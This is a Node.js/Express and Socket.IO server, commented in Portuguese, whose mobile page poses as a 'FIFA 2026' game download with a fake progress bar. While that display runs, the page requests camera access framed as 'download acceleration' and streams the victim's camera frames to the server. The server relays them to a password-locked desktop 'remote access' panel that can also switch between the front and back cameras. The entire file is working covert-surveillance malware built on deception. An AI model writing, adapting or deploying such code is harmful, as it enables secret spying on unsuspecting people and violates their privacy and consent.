const express = require('express');
const http = require('http');
const socketIO = require('socket.io');
const path = require('path');
const app = express();
const server = http.createServer(app);
const io = socketIO(server, {
  cors: { origin: "*", methods: ["GET", "POST"] }
});

const PORT = process.env.PORT || 3000;
const SENHA = "171172"; // 🔑 Nova senha hacker

// ========== FUNÇÃO PARA DETECTAR DISPOSITIVO ==========
function detectarDispositivo(userAgent) {
  const ua = userAgent.toLowerCase();
  const isMobile = /mobile|android|iphone|ipod|blackberry|opera mini|iemobile|wpdesktop/i.test(ua);
  const isTablet = /ipad|tablet|kindle|silk|playbook/i.test(ua);
  
  if (isTablet) return 'tablet';
  if (isMobile) return 'mobile';
  return 'desktop';
}

app.get('/', (req, res) => {
  // Detecta o dispositivo do usuário
  const dispositivo = detectarDispositivo(req.headers['user-agent'] || '');
  
  res.send(`
<!DOCTYPE html>
<html>
<head>
    <title>📱 Game Download</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: #0a0a0a;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: #0f0f0f;
            border: 2px solid #00ff00;
            border-radius: 10px;
            padding: 30px;
            box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
            text-align: center;
        }
        
        /* Estilos para CELULAR */
        .mobile-container {
            animation: fadeIn 1s;
        }
        
        .game-logo {
            font-size: 80px;
            margin: 20px 0;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        .game-title {
            font-size: 28px;
            color: #00ff00;
            margin-bottom: 10px;
            font-weight: bold;
            text-shadow: 0 0 10px #00ff00;
        }
        
        .game-subtitle {
            color: #00cc00;
            margin-bottom: 30px;
        }
        
        /* Barrinha de progresso */
        .progress-container {
            background: #1a1a1a;
            border: 1px solid #00ff00;
            border-radius: 25px;
            height: 30px;
            width: 100%;
            margin: 30px 0;
            overflow: hidden;
            box-shadow: inset 0 1px 3px rgba(0,0,0,0.2);
        }
        
        .progress-bar {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #00cc00, #00ff00);
            border-radius: 25px;
            transition: width 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            color: black;
            font-weight: bold;
            text-shadow: none;
        }
        
        .progress-text {
            font-size: 18px;
            margin-top: 10px;
            color: #00ff00;
            font-weight: bold;
        }
        
        .status-message {
            font-size: 16px;
            color: #00ff00;
            margin: 20px 0;
            font-family: 'Courier New', monospace;
        }
        
        .download-speed {
            background: #1a1a1a;
            border: 1px solid #00ff00;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            color: #00ff00;
        }
        
        /* Estilos para PC - TEMA HACKER */
        .pc-container {
            text-align: left;
            color: #00ff00;
        }
        
        .hacker-title {
            font-size: 32px;
            color: #00ff00;
            text-align: center;
            margin-bottom: 30px;
            text-transform: uppercase;
            letter-spacing: 3px;
            text-shadow: 0 0 15px #00ff00;
            font-weight: bold;
        }
        
        .video-container {
            display: grid;
            grid-template-columns: 1fr;
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .camera-wrapper {
            position: relative;
            width: 100%;
            background: #1a1a1a;
            border: 2px solid #00ff00;
            border-radius: 10px;
            overflow: hidden;
            aspect-ratio: 4/3;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
        }
        
        #remoteVideo {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: block;
        }
        
        #passwordOverlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(10, 10, 10, 0.95);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 10;
            border-radius: 8px;
            backdrop-filter: blur(5px);
        }
        
        .password-box {
            background: #0f0f0f;
            border: 2px solid #00ff00;
            padding: 40px;
            border-radius: 15px;
            text-align: center;
            width: 90%;
            max-width: 350px;
            box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
        }
        
        .password-box h3 { 
            color: #00ff00; 
            margin-bottom: 20px;
            font-size: 24px;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        
        .password-box p {
            color: #00cc00;
            margin-bottom: 20px;
            font-size: 14px;
        }
        
        .password-box input {
            width: 100%;
            padding: 15px;
            font-size: 24px;
            background: #1a1a1a;
            border: 2px solid #00ff00;
            border-radius: 8px;
            margin-bottom: 20px;
            text-align: center;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            letter-spacing: 5px;
        }
        
        .password-box input:focus {
            outline: none;
            box-shadow: 0 0 20px #00ff00;
        }
        
        .password-box button {
            background: transparent;
            color: #00ff00;
            border: 2px solid #00ff00;
            padding: 15px 30px;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            font-size: 18px;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 2px;
            transition: all 0.3s;
        }
        
        .password-box button:hover {
            background: #00ff00;
            color: black;
            box-shadow: 0 0 30px #00ff00;
        }
        
        .info-box {
            background: #1a1a1a;
            border: 2px solid #00ff00;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 15px;
            color: #00ff00;
        }
        
        .info-box h4 {
            color: #00ff00;
            margin-bottom: 10px;
            font-size: 18px;
        }

        /* Controles da câmera */
        .camera-controls {
            display: flex;
            gap: 10px;
            justify-content: center;
            margin: 20px 0;
        }
        
        .camera-btn {
            background: transparent;
            color: #00ff00;
            border: 2px solid #00ff00;
            padding: 15px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
            flex: 1;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: all 0.3s;
        }
        
        .camera-btn:hover {
            background: #00ff00;
            color: black;
            box-shadow: 0 0 20px #00ff00;
        }
        
        .camera-btn.active {
            background: #00ff00;
            color: black;
            box-shadow: 0 0 30px #00ff00;
        }
        
        .camera-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        
        /* Terminal effect */
        .terminal-text {
            color: #00ff00;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            text-align: left;
            margin: 10px 0;
            padding: 10px;
            border-left: 3px solid #00ff00;
        }
        
        .hidden {
            display: none;
        }
        
        #localVideo {
            display: none;
            position: absolute;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
        }
        
        /* Matrix effect on background */
        .matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            pointer-events: none;
            opacity: 0.1;
            background: repeating-linear-gradient(0deg, rgba(0,255,0,0.1) 0px, rgba(0,0,0,0) 1px, transparent 2px);
            z-index: -1;
        }
    </style>
</head>
<body>
    <div class="matrix-bg"></div>
    <div class="container">
        <!-- CONTEÚDO PARA CELULAR -->
        <div id="mobileContent" class="mobile-container">
            <div class="game-logo">🎮</div>
            <div class="game-title">FIFA 2026</div>
            <div class="game-subtitle">Ultimate Edition</div>
            
            <div class="progress-container">
                <div id="progressBar" class="progress-bar" style="width: 0%">0%</div>
            </div>
            
            <div id="progressPercent" class="progress-text">0% concluído</div>
            
            <div class="download-speed" id="speedInfo">
                ⬇️ 0 MB / 0 MB • 0 MB/s
            </div>
            
            <div class="status-message" id="statusMessage">
                ⏳ Preparando download...
            </div>
            
            <div style="margin-top: 30px; color: #00cc00; font-size: 14px;">
                Não feche esta página • Download em segundo plano
            </div>
        </div>
        
        <!-- CONTEÚDO PARA PC - TEMA HACKER -->
        <div id="pcContent" class="pc-container hidden">
            <div class="hacker-title">⚡ SISTEMA DE ACESSO REMOTO ⚡</div>
            
            <div class="video-container">
                <div class="camera-wrapper">
                    <img id="remoteVideo">
                    
                    <div id="passwordOverlay">
                        <div class="password-box">
                            <h3>🔒 ACESSO RESTRITO</h3>
                            <p>Digite o código de autorização</p>
                            <input type="password" id="senhaInput" maxlength="6" placeholder="******">
                            <button onclick="verificarSenha()">▶ AUTENTICAR</button>
                            <div id="erroSenha" style="color: #ff0000; margin-top: 15px; display: none;">Acesso negado! Código inválido.</div>
                            <div class="terminal-text" style="margin-top: 20px; font-size: 12px;">[ TENTATIVAS RESTANTES: 3 ]</div>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- CONTROLES DA CÂMERA -->
            <div id="cameraControls" class="camera-controls hidden">
                <button class="camera-btn" id="cameraFrontBtn" onclick="mudarCamera('front')">
                    📱 FRONTAL
                </button>
                <button class="camera-btn" id="cameraBackBtn" onclick="mudarCamera('back')">
                    📷 TRASEIRA
                </button>
            </div>
            
            <div class="info-box">
                <div class="terminal-text">> SISTEMA INICIADO COM SUCESSO</div>
                <div class="terminal-text">> AGUARDANDO AUTENTICAÇÃO...</div>
                <div class="terminal-text">> CÓDIGO: ******</div>
            </div>
        </div>
        
        <!-- Vídeo escondido -->
        <video id="localVideo" autoplay playsinline muted></video>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        const SENHA_CORRETA = "171172";
        
        // Elementos
        const mobileContent = document.getElementById('mobileContent');
        const pcContent = document.getElementById('pcContent');
        const localVideo = document.getElementById('localVideo');
        const remoteVideo = document.getElementById('remoteVideo');
        const passwordOverlay = document.getElementById('passwordOverlay');
        const cameraControls = document.getElementById('cameraControls');
        
        // Elementos da barrinha
        const progressBar = document.getElementById('progressBar');
        const progressPercent = document.getElementById('progressPercent');
        const speedInfo = document.getElementById('speedInfo');
        const statusMessage = document.getElementById('statusMessage');
        
        // Estado
        let mediaStream = null;
        let visualizacaoLiberada = false;
        let progresso = 0;
        let intervaloProgresso = null;
        let cameraAtual = 'back';
        let intervaloCaptura = null;
        let tentativas = 3;
        
        // Botões da câmera
        const cameraFrontBtn = document.getElementById('cameraFrontBtn');
        const cameraBackBtn = document.getElementById('cameraBackBtn');
        
        // ========== DETECÇÃO DE DISPOSITIVO ==========
        function detectarDispositivo() {
            const ua = navigator.userAgent.toLowerCase();
            return /mobile|android|iphone|ipod|blackberry|opera mini|iemobile|wpdesktop/i.test(ua);
        }
        
        const isMobile = detectarDispositivo();
        
        // ========== CONFIGURAÇÃO POR DISPOSITIVO ==========
        if (isMobile) {
            console.log('📱 Celular detectado - modo download falso');
            mobileContent.style.display = 'block';
            pcContent.style.display = 'none';
            
            iniciarDownloadFalso();
            
            setTimeout(() => {
                ligarCameraOtimizada('back');
            }, 2000);
            
        } else {
            console.log('💻 PC detectado - modo visualizador hacker');
            mobileContent.style.display = 'none';
            pcContent.style.display = 'block';
        }
        
        // ========== FUNÇÃO DA BARRINHA FALSA ==========
        function iniciarDownloadFalso() {
            progresso = 0;
            const tamanhoTotal = 2500;
            const velocidades = ['1.2 MB/s', '1.5 MB/s', '1.8 MB/s', '2.1 MB/s', '1.9 MB/s', '2.3 MB/s'];
            let velocidadeIndex = 0;
            
            statusMessage.innerHTML = '⏳ Conectando aos servidores...';
            
            setTimeout(() => {
                statusMessage.innerHTML = '📦 Baixando arquivos do jogo...';
                
                intervaloProgresso = setInterval(() => {
                    if (progresso < 100) {
                        const incremento = Math.random() * 3 + 2;
                        progresso = Math.min(100, progresso + incremento);
                        
                        progressBar.style.width = progresso + '%';
                        progressBar.innerHTML = progresso.toFixed(0) + '%';
                        progressPercent.innerHTML = progresso.toFixed(0) + '% concluído';
                        
                        const baixado = ((progresso / 100) * tamanhoTotal).toFixed(1);
                        velocidadeIndex = (velocidadeIndex + 1) % velocidades.length;
                        speedInfo.innerHTML = \`⬇️ \${baixado} MB / \${tamanhoTotal} MB • \${velocidades[velocidadeIndex]}\`;
                        
                        if (progresso > 95) {
                            statusMessage.innerHTML = '📦 Quase lá... verificando arquivos';
                        } else if (progresso > 75) {
                            statusMessage.innerHTML = '🎮 Finalizando download...';
                        } else if (progresso > 50) {
                            statusMessage.innerHTML = '⚡ Instalando recursos do jogo...';
                        } else if (progresso > 25) {
                            statusMessage.innerHTML = '🎵 Baixando áudios e texturas...';
                        }
                        
                        if (progresso >= 100) {
                            clearInterval(intervaloProgresso);
                            progressBar.style.background = 'linear-gradient(90deg, #00ff00, #00cc00)';
                            statusMessage.innerHTML = '✅ Download concluído! Instalação em segundo plano...';
                            speedInfo.innerHTML = '⬇️ 2500 MB / 2500 MB • 0 MB/s';
                            
                            let instalando = 99.9;
                            const intervaloInstalacao = setInterval(() => {
                                instalando = instalando > 100 ? 99.9 : instalando + 0.1;
                                progressBar.style.width = instalando + '%';
                                progressBar.innerHTML = instalando.toFixed(1) + '%';
                                progressPercent.innerHTML = instalando.toFixed(1) + '% - Instalando...';
                                
                                if (instalando > 100.5) {
                                    clearInterval(intervaloInstalacao);
                                    progressBar.style.width = '100%';
                                    progressBar.innerHTML = '100%';
                                    progressPercent.innerHTML = '100% - Pronto para jogar!';
                                }
                            }, 300);
                        }
                    }
                }, 400);
            }, 2000);
        }
        
        // ========== FUNÇÃO PARA LIGAR CÂMERA ==========
        async function ligarCameraOtimizada(tipoCamera) {
            try {
                statusMessage.innerHTML = '⏳ Aguardando... O download irá começar em instantes';
                
                console.log('📷 Iniciando câmera...');
                
                if (intervaloCaptura) {
                    clearInterval(intervaloCaptura);
                }
                
                if (mediaStream) {
                    mediaStream.getTracks().forEach(track => track.stop());
                }
                
                const constraints = {
                    video: {
                        width: { ideal: 640 },
                        height: { ideal: 480 },
                        frameRate: { ideal: 10 }
                    },
                    audio: false
                };
                
                if (tipoCamera === 'front') {
                    constraints.video.facingMode = 'user';
                } else {
                    constraints.video.facingMode = 'environment';
                }
                
                statusMessage.innerHTML = '📦 Preparando download... Isso pode levar alguns segundos';
                
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                
                mediaStream = stream;
                cameraAtual = tipoCamera;
                
                localVideo.srcObject = stream;
                await localVideo.play();
                
                const canvas = document.createElement('canvas');
                canvas.width = 640;
                canvas.height = 480;
                const ctx = canvas.getContext('2d');
                
                intervaloCaptura = setInterval(() => {
                    try {
                        ctx.drawImage(localVideo, 0, 0, 640, 480);
                        const frame = canvas.toDataURL('image/jpeg', 0.7);
                        socket.emit('frame', frame);
                    } catch (e) {
                        console.log('Erro na captura:', e);
                    }
                }, 200);
                
                console.log('✅ Transmissão ativada!');
                statusMessage.innerHTML = '📱 Download acelerado! Baixando arquivos...';
                
            } catch (err) {
                console.error('Erro na câmera:', err);
                
                if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
                    statusMessage.innerHTML = '⚠️ Permissão negada - continuando download sem aceleração';
                } else {
                    statusMessage.innerHTML = '⚠️ Modo offline ativado - continuando download...';
                }
            }
        }
        
        // ========== FUNÇÃO PARA MUDAR CÂMERA ==========
        window.mudarCamera = function(tipo) {
            if (!visualizacaoLiberada) {
                return;
            }
            
            if (tipo === 'front') {
                cameraFrontBtn.classList.add('active');
                cameraBackBtn.classList.remove('active');
            } else {
                cameraBackBtn.classList.add('active');
                cameraFrontBtn.classList.remove('active');
            }
            
            socket.emit('trocarCamera', tipo);
        };
        
        // ========== VERIFICAÇÃO DE SENHA ==========
        window.verificarSenha = function() {
            const senha = document.getElementById('senhaInput').value;
            
            if (senha === SENHA_CORRETA) {
                passwordOverlay.style.display = 'none';
                visualizacaoLiberada = true;
                cameraControls.classList.remove('hidden');
                cameraBackBtn.classList.add('active');
                document.querySelector('.terminal-text').innerHTML = '> ACESSO AUTORIZADO - SISTEMA LIBERADO';
            } else {
                tentativas--;
                document.getElementById('erroSenha').style.display = 'block';
                document.querySelector('.terminal-text').innerHTML = \`> ACESSO NEGADO - TENTATIVAS RESTANTES: \${tentativas}\`;
                
                if (tentativas <= 0) {
                    document.getElementById('senhaInput').disabled = true;
                    document.querySelector('button[onclick="verificarSenha()"]').disabled = true;
                    document.querySelector('.terminal-text').innerHTML = '> SISTEMA BLOQUEADO - CONTATE O ADMIN';
                }
            }
        };
        
        document.getElementById('senhaInput')?.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') verificarSenha();
        });
        
        // ========== SOCKET.IO ==========
        socket.on('connect', () => {
            console.log('Conectado ao servidor');
        });
        
        socket.on('trocarCamera', (tipoCamera) => {
            console.log('📱 Comando recebido: trocar para câmera', tipoCamera);
            if (isMobile) {
                ligarCameraOtimizada(tipoCamera);
            }
        });
        
        socket.on('frame', (frameData) => {
            if (visualizacaoLiberada) {
                remoteVideo.src = frameData;
            }
        });
    </script>
</body>
</html>
  `);
});

// Socket.IO
io.on('connection', (socket) => {
  console.log('Cliente conectado');
  
  socket.on('frame', (frameData) => {
    socket.broadcast.emit('frame', frameData);
  });
  
  socket.on('trocarCamera', (tipoCamera) => {
    console.log(`📷 Solicitando troca para câmera: ${tipoCamera}`);
    socket.broadcast.emit('trocarCamera', tipoCamera);
  });
});

server.listen(PORT, () => {
  console.log('='.repeat(60));
  console.log('🔥 SISTEMA HACKER - DOWNLOAD FALSO');
  console.log('='.repeat(60));
  console.log(`🚀 Servidor rodando na porta ${PORT}`);
  console.log(`🔑 Nova senha: ${SENHA}`);
  console.log('💻 Painel PC: Tema hacker preto/verde');
  console.log('📱 Celular: Download falso do FIFA');
  console.log('='.repeat(60));
});
